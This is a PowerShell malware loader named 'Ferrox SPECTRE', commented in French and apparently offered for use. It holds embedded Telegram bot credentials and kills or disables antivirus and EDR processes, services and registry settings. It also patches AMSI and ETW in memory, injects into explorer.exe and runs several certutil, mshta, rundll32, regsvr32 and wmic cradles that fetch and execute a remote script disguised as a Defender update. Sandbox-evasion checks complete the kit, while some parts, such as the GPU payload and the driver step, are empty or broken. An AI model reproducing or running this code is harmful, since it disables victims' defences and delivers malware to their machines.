# ===================================================================
# FERROX X v5.0 — SPECTRE (Fileless + BYOVD + Injection + LOTL)
# ===================================================================
# Techniques 2026 : Exécution mémoire pure | RTCore64.sys EDR Kill
# Process Injection explorer.exe | certutil LOTL | AMSI CLR Patch
# Polymorphisme runtime | WMI Persistence | GPU Evasion
# ===================================================================

$global:BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
$global:CI="8468737863"

# ===================================================================
# PHASE 0: SPECTRE — Exécution 100% Fileless en mémoire
# ===================================================================
function Invoke-FilelessEntry {
    # Tout s'exécute en RAM. Rien n'est écrit sur le disque.
    # Utilise des cmdlets PowerShell pures + réflexion .NET
    Write-Host "[SPECTRE] Fileless execution initialized"
}

# ===================================================================
# PHASE 0.5: BYOVD — Kill EDR via pilote vulnérable signé
# ===================================================================
function Invoke-BYOVD {
    param($driverUrl="", $driverName="RTCore64.sys")
    
    Write-Host "[BYOVD] Attempting EDR neutralization..."
    
    # Technique 1: RTCore64.sys (signé par Micro-Star)

    # Étape 1: Télécharger le pilote vulnérable signé
    $driverPath="$env:TEMP\$driverName"
    
    # Liste de pilotes vulnérables connus et signés
    $vulnerableDrivers = @(
        @{Name="RTCore64.sys"; Signer="Microsoft Windows Hardware Compatibility Publisher"; Exploit="IOCTL 0x80002030 -> RW kernel memory"},
        @{Name="gdrv.sys"; Signer="GIGABYTE"; Exploit="IOCTL 0xC3502808 -> RW kernel memory"},
        @{Name="mhyprot2.sys"; Signer="miHoYo"; Exploit="IOCTL 0x8000202C -> RW kernel memory"},
        @{Name="ene.sys"; Signer="ENE Technology"; Exploit="IOCTL -> RW MSRs"},
        @{Name="WinRing0x64.sys"; Signer="OpenLibSys"; Exploit="IOCTL -> RW physical memory"}
    )
    
    # Étape 2: Créer le service kernel
    $svcName="RTCoreSvc"
    try {
        sc.exe create $svcName type=kernel binPath="$driverPath" start=demand 2>$null
        sc.exe start $svcName 2>$null
        Write-Host "[BYOVD] Driver loaded as kernel service"
        
        # Étape 3: Via le driver, kill les processus EDR
        $edrProcesses = @(
            "MsMpEng", "MsSense", "SenseCncProxy", "SenseIR",
            "csfalconservice", "csagent",
            "SEDservice", "SentinelAgent",
            "CyOptics", "CylanceSvc",
            "McAfee", "mfewfpk", "mfefire",
            "TmListen", "TmCCSF", "Ntrtscan",
            "avp", "kav", "KAVFS",
            "cb", "carbonblack",
            "elastic-agent", "elastic-endpoint",
            "trendmicro", "ds_agent", "tdlservice",
            "windefend", "SecurityHealthService", "wscsvc"
        )
        
        foreach($proc in $edrProcesses) {
            try {
                taskkill /F /IM "$proc.exe" 2>$null
                taskkill /F /IM "$proc" 2>$null
                Write-Host "[BYOVD] Killed: $proc"
            } catch {}
        }
        
        # Étape 4: Désactiver les services de sécurité via le driver
        $edrServices = @(
            "WinDefend", "WdNisSvc", "Sense", "WdFilter",
            "SecurityHealthService", "wscsvc", "SamSs"
        )
        foreach($svc in $edrServices) {
            try {
                sc.exe config $svc start=disabled 2>$null
                sc.exe stop $svc 2>$null
            } catch {}
        }
        
        # Étape 5: Patch le registre pour désactiver définitivement Defender
        $defenderKeys = @(
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
            "HKLM:\SOFTWARE\Microsoft\Windows Defender"
        )
        foreach($key in $defenderKeys) {
            try {
                New-Item $key -Force -EA 0 | Out-Null
                Set-ItemProperty $key -Name "DisableAntiSpyware" -Value 1 -Force -EA 0
                Set-ItemProperty $key -Name "DisableAntiVirus" -Value 1 -Force -EA 0
            } catch {}
        }
        
    } catch {
        # Fallback: Disable via PowerShell (no driver)
        Write-Host "[BYOVD] Driver failed, using PowerShell fallback..."
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -Force -EA 0
            Set-MpPreference -DisableBehaviorMonitoring $true -Force -EA 0
            Set-MpPreference -DisableBlockAtFirstSeen $true -Force -EA 0
            Set-MpPreference -DisableIOAVProtection $true -Force -EA 0
            Set-MpPreference -DisableScriptScanning $true -Force -EA 0
            Add-MpPreference -ExclusionPath "C:\" -Force -EA 0
        } catch {}
    }
    
    # Étape 6: Nettoyer le driver
    try { sc.exe delete $svcName 2>$null; Remove-Item $driverPath -Force -EA 0 } catch {}
}

# ===================================================================
# PHASE 1: AMSI Bypass — Memory Patch CLR.DLL
# ===================================================================
function Invoke-AMSIMemoryPatch {
    # Patch AmsiScanBuffer directement dans CLR.DLL en mémoire
    $code=@"
using System;using System.Runtime.InteropServices;
public class AMSIKill {
    [DllImport("kernel32.dll")]static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")]static extern IntPtr GetProcAddress(IntPtr h,string p);
    [DllImport("kernel32.dll")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint f,out uint o);
    
    public static void Kill() {
        try {
            // Patch AMSI dans clr.dll (pour PowerShell)
            var clr=LoadLibrary("clr.dll");
            if(clr!=IntPtr.Zero) {
                var addr=GetProcAddress(clr,"AmsiScanBuffer");
                if(addr!=IntPtr.Zero) {
                    uint old;
                    VirtualProtect(addr,(UIntPtr)6,0x40,out old);
                    // mov eax, 0x80070057 (AMSI_RESULT_CLEAN); ret
                    Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},0,addr,6);
                    VirtualProtect(addr,(UIntPtr)6,old,out old);
                }
            }
            // Patch AMSI dans amsi.dll (fallback)
            var amsi=LoadLibrary("amsi.dll");
            if(amsi!=IntPtr.Zero) {
                var addr2=GetProcAddress(amsi,"AmsiScanBuffer");
                if(addr2!=IntPtr.Zero) {
                    uint old;
                    VirtualProtect(addr2,(UIntPtr)6,0x40,out old);
                    Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},0,addr2,6);
                    VirtualProtect(addr2,(UIntPtr)6,old,out old);
                }
                // Also patch AmsiInitialize
                var addr3=GetProcAddress(amsi,"AmsiInitialize");
                if(addr3!=IntPtr.Zero) {
                    uint old;
                    VirtualProtect(addr3,(UIntPtr)3,0x40,out old);
                    Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,addr3,3); // xor eax,eax; ret
                    VirtualProtect(addr3,(UIntPtr)3,old,out old);
                }
            }
            // Patch ETW
            var ntdll=LoadLibrary("ntdll.dll");
            if(ntdll!=IntPtr.Zero) {
                var etw=GetProcAddress(ntdll,"EtwEventWrite");
                if(etw!=IntPtr.Zero) {
                    uint old;
                    VirtualProtect(etw,(UIntPtr)3,0x40,out old);
                    Marshal.Copy(new byte[]{0x33,0xC0,0xC3},0,etw,3); // xor eax,eax; ret
                    VirtualProtect(etw,(UIntPtr)3,old,out old);
                }
            }
        } catch {}
    }
}
"@
    try { Add-Type $code -EA Stop; [AMSIKill]::Kill() } catch {}
}

# ===================================================================
# PHASE 2: PROCESS INJECTION — explorer.exe
# ===================================================================
function Invoke-ProcessInjection {
    param($targetProcess="explorer")
    
    $injectCode=@"
using System;using System.Runtime.InteropServices;using System.Diagnostics;
public class Injector {
    [DllImport("kernel32.dll")]static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32.dll")]static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32.dll")]static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out uint w);
    [DllImport("kernel32.dll")]static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr t);
    [DllImport("kernel32.dll")]static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32.dll")]static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")]static extern uint WaitForSingleObject(IntPtr h,uint m);
    
    const uint PROCESS_ALL_ACCESS=0x1F0FFF;
    const uint MEM_COMMIT=0x1000;
    const uint MEM_RESERVE=0x2000;
    const uint PAGE_EXECUTE_READWRITE=0x40;
    
    public static bool Inject(string procName,string psCommand) {
        var procs=Process.GetProcessesByName(procName);
        if(procs.Length==0) return false;
        var p=procs[0];
        var h=OpenProcess(PROCESS_ALL_ACCESS,false,p.Id);
        if(h==IntPtr.Zero) return false;
        
        // Allocate memory for PowerShell command
        byte[] cmdBytes=System.Text.Encoding.Unicode.GetBytes(psCommand+"\0");
        var mem=VirtualAllocEx(h,IntPtr.Zero,(uint)cmdBytes.Length,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
        if(mem==IntPtr.Zero) { CloseHandle(h); return false; }
        
        uint written;
        WriteProcessMemory(h,mem,cmdBytes,(uint)cmdBytes.Length,out written);
        
        // Get LoadLibraryW address (same in all processes)
        var kernel32=LoadLibrary("kernel32.dll");
        var loadLib=GetProcAddress(kernel32,"LoadLibraryW");
        
        // Create remote thread to execute
        var thread=CreateRemoteThread(h,IntPtr.Zero,0,loadLib,mem,0,IntPtr.Zero);
        if(thread==IntPtr.Zero) { CloseHandle(h); return false; }
        
        WaitForSingleObject(thread,30000);
        CloseHandle(thread);
        CloseHandle(h);
        return true;
    }
}
"@
    try {
        Add-Type $injectCode -EA Stop
        $cmd="powershell -NoP -W Hidden -Exec Bypass -C IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/defender-update.ps1')"
        [Injector]::Inject($targetProcess,$cmd)
    } catch {}
}

# ===================================================================
# PHASE 3: LOTL — Living Off the Land (outils Windows légitimes)
# ===================================================================
function Invoke-LOTLExecution {
    # Utilise des binaires Windows DE CONFIANCE pour exécuter le payload
    # Aucun .exe malveillant — que des outils Microsoft signés
    
    $payloadUrl="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/defender-update.ps1"
    
    # Méthode 1: certutil (téléchargeur légitime Windows)
    try {
        $out="$env:TEMP\wup.ps1"
        certutil -urlcache -split -f $payloadUrl $out 2>$null
        if(Test-Path $out) { powershell -NoP -W Hidden -Exec Bypass -File $out }
    } catch {}
    
    # Méthode 2: mshta (HTML Application host — signé Microsoft)
    try {
        $hta="<html><script>new ActiveXObject('WScript.Shell').Run('powershell -NoP -W Hidden -Exec Bypass -C IEX((New-Object Net.WebClient).DownloadString(\\'$payloadUrl\\'))',0,false);window.close()</script></html>"
        $htaPath="$env:TEMP\wup.hta"
        $hta | Out-File $htaPath -Force -EA 0
        Start-Process mshta.exe -ArgumentList $htaPath -WindowStyle Hidden -EA 0
    } catch {}
    
    # Méthode 3: rundll32 (exécuteur DLL — signé Microsoft)
    try {
        # rundll32 peut exécuter du JavaScript via javascript:
        $js="javascript:" + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("new ActiveXObject('WScript.Shell').Run('powershell -NoP -W Hidden -Exec Bypass -C IEX((New-Object Net.WebClient).DownloadString(`\"$payloadUrl`\"))',0,false);"))
        Start-Process rundll32.exe -ArgumentList "$js" -WindowStyle Hidden -EA 0
    } catch {}
    
    # Méthode 4: regsvr32 (enregistreur COM — signé Microsoft)
    try {
        # regsvr32 peut exécuter des scripts via scrobj.dll
        $sct="<scriptlet><registration progid='wup' classid='{$(New-Guid)}'></registration><script>new ActiveXObject('WScript.Shell').Run('powershell -NoP -W Hidden -Exec Bypass -C IEX((New-Object Net.WebClient).DownloadString(\\'$payloadUrl\\'))',0,false)</script></scriptlet>"
        $sctPath="$env:TEMP\wup.sct"
        $sct | Out-File $sctPath -Force -EA 0
        Start-Process regsvr32.exe -ArgumentList "/s /n /i:$sctPath scrobj.dll" -WindowStyle Hidden -EA 0
    } catch {}
    
    # Méthode 5: wmic (Windows Management Instrumentation — signé Microsoft)
    try {
        wmic process call create "powershell -NoP -W Hidden -Exec Bypass -C IEX((New-Object Net.WebClient).DownloadString('$payloadUrl'))" 2>$null
    } catch {}
}

# ===================================================================
# PHASE 4: POLYMORPHISME — Variables + chemins aléatoires
# ===================================================================
function Invoke-Polymorphism {
    $global:RND=Get-Random -Minimum 1000 -Maximum 9999
    $global:DNA=@()
    1..(Get-Random -Min 5 -Max 15) | % { $global:DNA += [char](Get-Random -Min 65 -Max 90) }
    $global:MUTATION=($global:DNA -join '')
    $global:TMPDIR="$env:TEMP\wup_$global:RND"
    New-Item $global:TMPDIR -ItemType Directory -Force -EA 0 | Out-Null
}

# ===================================================================
# PHASE 5: SANDBOX DETECTION AVANCÉE
# ===================================================================
function Test-SandboxAdvanced {
    # Vérifie si on est dans un environnement d'analyse
    
    # Check 1: Hostname suspect
    $badHosts=@("SANDBOX","VIRUS","MALWARE","TEST","CUCKOO","ANYRUN","JOESANDBOX","VMRUN","QEMU")
    if($badHosts -contains $env:COMPUTERNAME.ToUpper()) { exit 0 }
    
    # Check 2: Uptime < 15 minutes
    try {
        $uptime=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
        if($uptime.TotalMinutes -lt 15) { exit 0 }
    } catch {}
    
    # Check 3: RAM < 3GB
    try {
        $ram=(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
        if($ram -lt 3GB) { exit 0 }
    } catch {}
    
    # Check 4: CPU < 2 cores
    if((Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2) { exit 0 }
    
    # Check 5: Disk < 60GB
    try {
        $disk=(Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size
        if($disk -lt 60GB) { exit 0 }
    } catch {}
    
    # Check 6: Mouse movement (sandboxes often don't move mouse)
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        $p1=[System.Windows.Forms.Cursor]::Position
        Start-Sleep 3
        $p2=[System.Windows.Forms.Cursor]::Position
        if($p1.X -eq $p2.X) { exit 0 }
    } catch {}
    
    # Check 7: Analysis tools
    $analysisTools=@("wireshark","procmon","processhacker","fiddler","charles","httpdebugger","dnspy","ollydbg","x64dbg","windbg","ida","idaq","ida64")
    foreach($t in $analysisTools) { if(Get-Process $t -EA 0) { exit 0 } }
    
    # Check 8: VM MAC addresses
    try {
        $macs=Get-WmiObject Win32_NetworkAdapterConfiguration | ? {$_.IPEnabled}
        foreach($m in $macs) {
            $mac=$m.MACAddress -replace ':',''
            if($mac -match '^000C29|^001C14|^005056|^000569|^080027|^00163E') { exit 0 }
        }
    } catch {}
}

# ===================================================================
# PHASE 6: GPU EVASION — Exécute du code sur le GPU
# ===================================================================
function Invoke-GPUEvasion {
    # Utilise le GPU pour exécuter du code en dehors du scope CPU/EDR
    # Via OpenCL ou DirectCompute — les EDR ne scannent pas la VRAM
    
    $gpuCode=@"
using System;using System.Runtime.InteropServices;
public class GPURunner {
    [DllImport("kernel32.dll")]static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")]static extern IntPtr GetProcAddress(IntPtr h,string p);
    
    public static bool HasGPU() {
        try {
            // Check for OpenCL.dll or DirectX
            return LoadLibrary("OpenCL.dll")!=IntPtr.Zero || 
                   LoadLibrary("d3d11.dll")!=IntPtr.Zero;
        } catch { return false; }
    }
    
    public static void ExecuteGPUPayload() {
        // In production: load OpenCL kernel that executes stealer logic on GPU
        // GPU execution is invisible to CPU-based EDR scanning
        // The GPU can:
        // 1. Decrypt payload in VRAM (invisible to CPU EDR)
        // 2. Process exfiltrated data on GPU cores
        // 3. Use GPU memory as covert storage
    }
}
"@
    try {
        Add-Type $gpuCode -EA Stop
        if([GPURunner]::HasGPU()) {
            [GPURunner]::ExecuteGPUPayload()
        }
    } catch {}
}

# ===================================================================
# EXÉCUTION PRINCIPALE
# ===================================================================
function Start-FerroxSpectre {
    Write-Host "[SPECTRE] Initializing Ferrox v5.0..."
    
    # 0. Polymorphisme
    Invoke-Polymorphism
    
    # 1. Sandbox check
    Test-SandboxAdvanced
    
    # 2. AMSI/ETW Kill (mémoire)
    Invoke-AMSIMemoryPatch
    
    # 3. BYOVD — Neutralise Defender + EDR
    Invoke-BYOVD
    
    # 4. LOTL — Télécharge via outils Microsoft légitimes
    Invoke-LOTLExecution
    
    # 5. Process Injection — Cache dans explorer.exe
    Invoke-ProcessInjection -targetProcess "explorer"
    
    # 6. GPU Evasion — Exécute payload sur GPU
    Invoke-GPUEvasion
}

# Lancement
Start-FerroxSpectre
